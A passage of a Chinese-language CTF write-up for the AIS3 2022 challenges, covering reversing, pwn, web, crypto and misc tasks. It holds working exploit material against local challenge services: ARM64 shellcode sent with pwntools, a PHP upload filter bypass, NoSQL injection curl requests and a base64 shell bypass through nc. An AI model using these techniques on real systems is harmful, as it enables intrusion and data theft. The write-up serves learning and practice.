class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/AIS3<span class="number">-2022</span>/reverse/management_time$ gdb ./fixed_chal</span><br><span class="line">GNU <span class="title function_">gdb</span> <span class="params">(Ubuntu <span class="number">8.3</span><span class="number">-0u</span>buntu1)</span> 8.3</span><br><span class="line">gef➤  b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x1090</span><br><span class="line">[ Legend: Modified <span class="keyword">register</span> | Code | Heap | Stack | String ]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x0</span><br><span class="line">$rbx   : 0x0</span><br><span class="line">$rcx   : 0x2c</span><br><span class="line">$rdx   : 0x454b4146</span><br><span class="line">$rsp   : 0x007fffffffe128  →  0x0055555555524b  →  &lt;main+162&gt; mov eax, DWORD PTR [rbp-0xc]</span><br><span class="line">$rbp   : 0x007fffffffe140  →  0x00555555555290  →  &lt;__libc_csu_init+0&gt; endbr64</span><br><span class="line">$rsi   : 0x33534941</span><br><span class="line">$rdi   : 0x005555555560de  →  0<span class="title function_">x00000000006325</span> <span class="params">(<span class="string">&quot;%c&quot;</span>?)</span></span><br><span class="line">$rip   : 0x007ffff7e24d70  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span><br><span class="line">$r8    : 0x2e</span><br><span class="line">$r9    : 0x7c</span><br><span class="line">$r10   : 0x007ffff7faabe0  →  0x005555555596a0  →  0x0000000000000000</span><br><span class="line">$r11   : 0x246</span><br><span class="line">$r12   : 0x005555555550c0  →  &lt;_start+0&gt; endbr64</span><br><span class="line">$r13   : 0x007fffffffe220  →  0x0000000000000001</span><br><span class="line">$r14   : 0x0</span><br><span class="line">$r15   : 0x0</span><br><span class="line">$eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── <span class="built_in">stack</span> ────</span><br><span class="line">0x007fffffffe128│+0x0000: 0x0055555555524b  →  &lt;main+162&gt; mov eax, DWORD PTR [rbp-0xc]	 ← $rsp</span><br><span class="line">0x007fffffffe130│+0x0008: 0x33534941ffffe220</span><br><span class="line">0x007fffffffe138│+0x0010: 0x0000000000000000</span><br><span class="line">0x007fffffffe140│+0x0018: 0x00555555555290  →  &lt;__libc_csu_init+0&gt; endbr64 	 ← $rbp</span><br><span class="line">0x007fffffffe148│+0x0020: 0x007ffff7de71e3  →  &lt;__libc_start_main+243&gt; mov edi, eax</span><br><span class="line">0x007fffffffe150│+0x0028: 0x0000000000000000</span><br><span class="line">0x007fffffffe158│+0x0030: 0x007fffffffe228  →  0x007fffffffe4e6  →  &quot;/home/jeff14994/Desktop/AIS3-2022/reverse/manageme[...]&quot;</span><br><span class="line">0x007fffffffe160│+0x0038: 0x0000000100040000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e24d61 &lt;<span class="built_in">fprintf</span>+177&gt;    ret</span><br><span class="line">   0x7ffff7e24d62 &lt;<span class="built_in">fprintf</span>+178&gt;    call   0x7ffff7ef2d60 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e24d67                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e24d70 &lt;<span class="built_in">printf</span>+0&gt;       endbr64</span><br><span class="line">   0x7ffff7e24d74 &lt;<span class="built_in">printf</span>+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e24d7b &lt;<span class="built_in">printf</span>+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e24d7e &lt;<span class="built_in">printf</span>+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e24d83 &lt;<span class="built_in">printf</span>+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e24d88 &lt;<span class="built_in">printf</span>+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;fixed_chal&quot;, stopped 0x7ffff7e24d70 in __<span class="title function_">printf</span> <span class="params">()</span>, reason: BREAKPOINT</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x7ffff7e24d70 → __<span class="title function_">printf</span><span class="params">(format=<span class="number">0x5555555560de</span> <span class="string">&quot;%c&quot;</span>)</span></span><br><span class="line">[#1] 0x55555555524b → <span class="title function_">main</span><span class="params">()</span></span><br></pre></td></tr></table></figure>
+<p>接著再重組散亂的 flag<br><img src="https://hackmd.io/_uploads/HkZKzAbwq.png"></p>
+<h4 id="Got-flag-AIS3-You-are-the-master-of-time-management"><a href="#Got-flag-AIS3-You-are-the-master-of-time-management" class="headerlink" title="Got flag: AIS3{You_are_the_master_of_time_management!!!!!}"></a>Got flag: <code>AIS3&#123;You_are_the_master_of_time_management!!!!!&#125;</code></h4><h3 id="Give-Me-SC"><a href="#Give-Me-SC" class="headerlink" title="Give Me SC"></a>Give Me SC</h3><p>要給 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47048">ARM64 的 shellcode</a></p>
+<h4 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode = <span class="string">b&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">15566</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;omg&quot;</span>.encode())</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h4><p><img src="https://hackmd.io/_uploads/SkfzFQys5.png"></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="[Web]"></a>[Web]</h2><h3 id="Poking-Bear"><a href="#Poking-Bear" class="headerlink" title="Poking Bear"></a><code>Poking Bear</code></h3><p>根據我觀察到的規律，解答有可能在 endpoint <code>350 - 777</code> 的區間，可以戳出圖案。但不確定是哪一個，所以我使用 Burp Suite 來猜，結過發現 <code>499</code> 的 response 跟其他人的不同<br><img src="https://hackmd.io/_uploads/rJt8rR-Pq.png"></p>
+<p>在 <code>499</code> 發現 SECRET BEAR<br><img src="https://hackmd.io/_uploads/ryK8rRbD5.png"></p>
+<p>發現會驗證 Cookie，因此把 Value 改成 <code>&quot;bear poker&quot;</code> 就可以拿到 flag<br><img src="https://hackmd.io/_uploads/H15IH0-v9.png"></p>
+<h4 id="Result-2"><a href="#Result-2" class="headerlink" title="Result"></a>Result</h4><p><img src="https://hackmd.io/_uploads/BkYLrRWPq.png"></p>
+<h4 id="Got-flag-AIS3-y0u-P0l3-7h3-Bear-H-rdLy-lt"><a href="#Got-flag-AIS3-y0u-P0l3-7h3-Bear-H-rdLy-lt" class="headerlink" title="Got flag: AIS3{y0u_P0l3_7h3_Bear_H@rdLy&lt;}"></a>Got flag: <code>AIS3&#123;y0u_P0l3_7h3_Bear_H@rdLy&lt;&#125;</code></h4><h3 id="Simple-File-Uploader"><a href="#Simple-File-Uploader" class="headerlink" title="Simple File Uploader"></a><code>Simple File Uploader</code></h3><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>是 PHP 的題目，但我忘記存它的 source code。我記得它會先驗證 file extension (使用 php, php5 等等會被 block)，接著驗證裡面的內容（使用黑名單，使用 eval(), passthru() 等等的函式會被 block），上傳完就會拿到 <code>/upload/xxx.php</code> 來執行你上傳的程式</p>
+<p>我試了很多次，不過我就只講成功的那一次</p>
+<ol>
+<li>Bypass 副檔名 <code>.PHp</code></li>
+<li>Bypass 內容驗證 <code>echo `[arbitrary command]`;</code><h4 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">檔名 exploit.PHp</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#echo `ls /`;</span></span><br><span class="line"><span class="keyword">echo</span> `/rUn_M3_t0_9et_fL4g`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+使用 <code>ls</code> 看到的內容，發現有一個 <code>rUn_M3_t0_9et_fL4g</code> &#x3D;&gt; run me to get flag<br><img src="https://hackmd.io/_uploads/H17OFCbv5.png"></li>
+</ol>
+<p>執行完 <code>/rUn_M3_t0_9et_fL4g</code><br><img src="https://hackmd.io/_uploads/HJ-FtCZwc.png"></p>
+<h4 id="Got-flag-AIS3-H3yyyyyyyy-U-g0t-mi٩-ˊᗜˋ-و"><a href="#Got-flag-AIS3-H3yyyyyyyy-U-g0t-mi٩-ˊᗜˋ-و" class="headerlink" title="Got flag: AIS3{H3yyyyyyyy_U_g0t_mi٩(ˊᗜˋ*)و}"></a>Got flag: <code>AIS3&#123;H3yyyyyyyy_U_g0t_mi٩(ˊᗜˋ*)و&#125;</code></h4><h3 id="the-best-login-ui"><a href="#the-best-login-ui" class="headerlink" title="the_best_login_ui"></a>the_best_login_ui</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br></pre></td></tr></table></figure>
+
+<p>可以透過 <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">no_sql injection</a> 進行 data leaking</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1:54088/login -d <span class="string">&#x27;username=admin&amp;password[$regex]=.&#123;41&#125;&#x27;</span></span><br><span class="line"><span class="comment"># Result: Success owo!</span></span><br><span class="line"></span><br><span class="line">curl 127.0.0.1:54088/login -d <span class="string">&#x27;username=admin&amp;password[$regex]=.&#123;42&#125;&#x27;</span></span><br><span class="line"><span class="comment"># Result: Failed qwq</span></span><br><span class="line"><span class="comment"># 可以知道 flag 長度是 41</span></span><br><span class="line"></span><br><span class="line">curl 127.0.0.1:54088/login -d <span class="string">&#x27;username[$ne]=toto&amp;password[$regex]=AIS3&#123;B.&#123;35&#125;&#x27;</span></span><br><span class="line"><span class="comment"># Result: Success owo!</span></span><br><span class="line"><span class="comment"># 可以透過 $regex 進行抹一個字元的 leak</span></span><br><span class="line"><span class="comment"># 注意有特殊字元，記得逃脫</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="[Crypto]"></a>[Crypto]</h2><h3 id="SC"><a href="#SC" class="headerlink" title="SC"></a><code>SC</code></h3><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><p>看到關鍵字 <code>Substitution cipher</code>，想說看網路上有沒有現成的工具可以解，結果發現沒有，所以最後自幹。用紙筆大概解了 30-40 分鐘，中間有幾次把 <code>0</code> 當成 <code>O</code>差點解不出來</p>
+<h4 id="密文-x3D-gt-要想辦法找到對應的-key-轉回明文"><a href="#密文-x3D-gt-要想辦法找到對應的-key-轉回明文" class="headerlink" title="密文 &#x3D;&gt; 要想辦法找到對應的 key 轉回明文"></a>密文 &#x3D;&gt; 要想辦法找到對應的 key 轉回明文</h4><p><code>5xvJ&#123;IVnCDwT_I24t6W626DVw_ODPzJi_FDMz_awVFw_PWmDw6J86_m66cOa&#125;</code></p>
+<h4 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h4><p>加密過程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shuffle</span>(<span class="params">x</span>):</span><br><span class="line">    x = <span class="built_in">list</span>(x)</span><br><span class="line">    random.shuffle(x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">T, file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file) <span class="keyword">as</span> f:</span><br><span class="line">        pt = f.read()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;file&#125;</span>.enc&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pt.translate(T))</span><br><span class="line"></span><br><span class="line">charset = string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">shuffled = <span class="string">&quot;&quot;</span>.join(shuffle(charset))</span><br><span class="line">T = <span class="built_in">str</span>.maketrans(charset, shuffled)</span><br><span class="line"></span><br><span class="line">encrypt(T, <span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">encrypt(T, __file__)</span><br></pre></td></tr></table></figure>
+<h4 id="自幹筆記"><a href="#自幹筆記" class="headerlink" title="自幹筆記"></a>自幹筆記</h4><p>一左一右找對應（從 <code>[0-9A-Za-z]</code>）<br><img src="https://hackmd.io/_uploads/SkV2j0ZDc.png"></p>
+<p>找完對應後，再把 flag 轉回來<br><img src="https://hackmd.io/_uploads/BkjDs0bv9.jpg"></p>
+<p>結果發現 Python 好像可以用 <code>maketrans()</code> 來轉換…</p>
+<h4 id="Got-flag-我發現好像沒存到-，不過可以在筆記裡面看到"><a href="#Got-flag-我發現好像沒存到-，不過可以在筆記裡面看到" class="headerlink" title="Got flag: 我發現好像沒存到...，不過可以在筆記裡面看到"></a>Got flag: <code>我發現好像沒存到...，不過可以在筆記裡面看到</code></h4><h2 id="Misc"><a href="#Misc" class="headerlink" title="[Misc]"></a>[Misc]</h2><h3 id="Gift-in-the-dream"><a href="#Gift-in-the-dream" class="headerlink" title="Gift in the dream"></a><code>Gift in the dream</code></h3><h4 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h4><p><code>strings</code> binary 後發現 hint: <code>Qwhy is the animation lagging? why is the duration so weird? is this just a dream?</code>，猜想應該跟<code>gif</code>的時間間隔有關</p>
+<h4 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify -format <span class="string">&quot;%s %T \n&quot;</span> gift_in_the_dream_updated.gif | <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f2 | awk <span class="string">&#x27;&#123; printf(&quot;%c&quot;,$0); &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Result-3"><a href="#Result-3" class="headerlink" title="Result"></a>Result</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">identify -format <span class="string">&quot;%s %T \n&quot;</span> gift_in_the_dream_updated.gif | <span class="built_in">cut</span> -d <span class="string">&#x27; &#x27;</span> -f2 | awk <span class="string">&#x27;&#123; printf(&quot;%c&quot;,$0); &#125;&#x27;</span></span><br><span class="line">AIS3&#123;5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe&#125;%</span><br></pre></td></tr></table></figure>
+<h4 id="Got-flag-AIS3-5T3g4n0gR4pHy-c4N-b3-fUn-s0m37iMe"><a href="#Got-flag-AIS3-5T3g4n0gR4pHy-c4N-b3-fUn-s0m37iMe" class="headerlink" title="Got flag: AIS3{5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe}"></a>Got flag: <code>AIS3&#123;5T3g4n0gR4pHy_c4N_b3_fUn_s0m37iMe&#125;</code></h4><h3 id="Excel"><a href="#Excel" class="headerlink" title="Excel"></a><code>Excel</code></h3><p>使用 <code>binwalk</code>、<code>openpyxl</code> 解出來的結果都很怪，最後還是使用 M$ 的<code>Excel</code> 來開這個檔案</p>
+<p>一打開就看到跳 macros<br><img src="https://hackmd.io/_uploads/rJTBe1MP5.png"></p>
+<p>接著看到 <code>openpyxl</code>，猜官方解應該是用這個套件<br><img src="https://hackmd.io/_uploads/Hy5_xyGPc.png"></p>
+<p>最後發現 <code>Worksheets</code> 應該有這麼多，但都沒顯示出來<br><img src="https://hackmd.io/_uploads/ryOwlyzv5.png"></p>
+<h4 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h4><p>Google 一下怎麼顯示隱藏的 worksheets 後，在 <code>A58</code> 發現一個 Formula。執行後，在 <code>A137</code> 便可找到結果<br><img src="https://hackmd.io/_uploads/B1xDZ1zw5.png"></p>
+<p>現在才發現原來 Excel 可以隱藏 worksheets LOL) （技能 GET）<br><img src="https://hackmd.io/_uploads/B1xDWkfw9.png"></p>
+<h4 id="Result-4"><a href="#Result-4" class="headerlink" title="Result"></a>Result</h4><p><img src="https://hackmd.io/_uploads/SJlgPbyMD5.png"></p>
+<h4 id="Got-flag-AIS3-XLM-iS-to0-o1d-but-co0o0o00olll"><a href="#Got-flag-AIS3-XLM-iS-to0-o1d-but-co0o0o00olll" class="headerlink" title="Got flag: AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}"></a>Got flag: <code>AIS3&#123;XLM_iS_to0_o1d_but_co0o0o00olll!!&#125;</code></h4><h3 id="knock"><a href="#knock" class="headerlink" title="knock"></a><code>knock</code></h3><p>先用 wireshark 錄封包，敲完後開始分析<br><code>udp &amp;&amp; ip.src==10.113.203.111 &amp;&amp; not icmp</code></p>
+<p><img src="https://hackmd.io/_uploads/HyHu_YAq5.png"></p>
+<p>可以看到 port number 都不同</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># port.txt</span></span><br><span class="line"><span class="number">12065</span></span><br><span class="line"><span class="number">12073</span></span><br><span class="line"><span class="number">12083</span></span><br><span class="line"><span class="number">12051</span></span><br><span class="line"><span class="number">12123</span></span><br><span class="line"><span class="number">12107</span></span><br><span class="line"><span class="number">12110</span></span><br><span class="line"><span class="number">12048</span></span><br><span class="line"><span class="number">12099</span></span><br><span class="line"><span class="number">12107</span></span><br><span class="line"><span class="number">12075</span></span><br><span class="line"><span class="number">12078</span></span><br><span class="line"><span class="number">12079</span></span><br><span class="line"><span class="number">12067</span></span><br><span class="line"><span class="number">12075</span></span><br><span class="line"><span class="number">12107</span></span><br><span class="line"><span class="number">12110</span></span><br><span class="line"><span class="number">12111</span></span><br><span class="line"><span class="number">12099</span></span><br><span class="line"><span class="number">12107</span></span><br><span class="line"><span class="number">12125</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> port.txt | <span class="built_in">cut</span> -c 3-5 | awk <span class="string">&#x27;&#123;printf(&quot;%c&quot;,$1)&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cut</span></span><br><span class="line"><span class="comment"># -c list</span></span><br><span class="line"><span class="comment">#             The list specifies character positions.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># awk</span></span><br><span class="line"><span class="comment">#  An input line is normally made up of fields separated by white space, or by the regular expression FS.  The fields are denoted $1, $2, ..., while $0</span></span><br><span class="line"><span class="comment">#        refers to the entire line.  If FS is null, the input line is split into one field per character.</span></span><br><span class="line"><span class="comment">#        A pattern-action statement has the form:</span></span><br><span class="line"><span class="comment">#               pattern &#123; action &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tr -d &quot;x&quot;</span></span><br><span class="line"><span class="comment"># -d      Delete characters in string1 from the input.</span></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://linuxhint.com/remove_characters_string_bash/">cut</a><br><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10136126">awk</a><br><a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/printf-command-in-linux-with-examples/">printf</a><br><a target="_blank" rel="noopener" href="https://www.tecmint.com/xargs-command-examples/">xargs</a></p>
+<h4 id="Got-flag-AIS3-kn0ckKNOCKknock"><a href="#Got-flag-AIS3-kn0ckKNOCKknock" class="headerlink" title="Got flag: AIS3{kn0ckKNOCKknock}"></a>Got flag: <code>AIS3&#123;kn0ckKNOCKknock&#125;</code></h4><h3 id="seadog-webshell"><a href="#seadog-webshell" class="headerlink" title="seadog_webshell"></a>seadog_webshell</h3><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><p>題目的 <code>docker-compose.yml</code>，flag 藏在環境變數，port 開在 12369，並且啟動 <a target="_blank" rel="noopener" href="http://120.105.184.250/cswang/thit/Linux/XINETD.htm">xinetd</a> 當作 daemon，而這個 daemon 則呼叫了 webshell，而這個 webshell 則是短短的一個指令 <code>base64 | timeout 10s sh</code></p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker-compose.yml 裡面可以看到它 build 一個 image</span></span><br><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  seadog-<span class="keyword">shell</span><span class="language-bash">:</span></span><br><span class="line">    build: ./</span><br><span class="line">    volumes:</span><br><span class="line">      - ./src/webshell:/webshell:ro</span><br><span class="line">      - ./xinetd:/etc/xinetd.d/seadog-<span class="keyword">shell</span><span class="language-bash">:ro</span></span><br><span class="line">    environment:</span><br><span class="line">      FLAG: AIS3&#123;not real flag&#125;</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;12369:12369&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dockerfile</span></span><br><span class="line"><span class="keyword">FROM</span> archlinux:base</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pacman -Syyu --noconfirm</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pacman -S coreutils xinetd --noconfirm</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/usr/sbin/xinetd&quot;</span>, <span class="string">&quot;-dontfork&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># xinetd</span></span><br><span class="line">service seadog-<span class="keyword">shell</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">&#123;</span></span><br><span class="line">    disable = no</span><br><span class="line">    type = UNLISTED</span><br><span class="line">    wait = no</span><br><span class="line">    server = /webshell</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol = tcp</span><br><span class="line">    <span class="keyword">user</span> = ctf</span><br><span class="line">    port = <span class="number">12369</span></span><br><span class="line">    flags = REUSE</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># webshell</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exec 2&gt;/dev/null</span></span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">base64 | timeout <span class="number">10</span>s sh</span><br></pre></td></tr></table></figure>
+<h4 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h4><p>想辦法繞過這個 <code>base64</code> 並取得環境變數 flag</p>
+<p>因為 base64 的原理是每 4 個字元可以轉換成 3 個字元，所以要想辦法湊成指令，滿足</p>
+<ol>
+<li>字元在 base64 的索引範圍</li>
+<li>字元數是四的倍數（可以用 &#x2F; 來湊字數）</li>
+<li>轉換後仍可以執行 linux command</li>
+</ol>
+<p><img src="https://hackmd.io/_uploads/SyJvz90c5.png"></p>
+<p><a target="_blank" rel="noopener" href="https://www.wikiwand.com/zh-tw/Base64">Resources</a></p>
+<h4 id="Exploit-5"><a href="#Exploit-5" class="headerlink" title="Exploit:"></a>Exploit:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;//bin/ls&quot;</span> | <span class="built_in">base64</span> -d | nc 127.0.0.1 12369</span><br><span class="line"></span><br><span class="line"><span class="comment"># The flag is stored in the environment variable</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/usr/bin/env&quot;</span> | <span class="built_in">base64</span> -d | nc 127.0.0.1 12369</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/Sy2KotC99.png"></p>
+<p><img src="https://hackmd.io/_uploads/BkJsiYAqq.png"></p>
+<h3 id="astjail"><a href="#astjail" class="headerlink" title="astjail"></a><a target="_blank" rel="noopener" href="https://chenkb91.github.io/writeup/2022/06/07/ais3-2022-writeup.html">astjail</a></h3><h4 id="Descripiton"><a href="#Descripiton" class="headerlink" title="Descripiton"></a>Descripiton</h4><p><a target="_blank" rel="noopener" href="https://www.gushiciku.cn/pl/2F7p/zh-tw">Python sandbox</a> 要想辦法逃脫這個 sandbox，然後取得 flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#       ...</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, ast.Slice):</span><br><span class="line">            <span class="keyword">return</span> traverse(node.lower) <span class="keyword">and</span> traverse(node.upper)</span><br><span class="line"><span class="comment">#.      ...</span></span><br></pre></td></tr></table></figure>
+
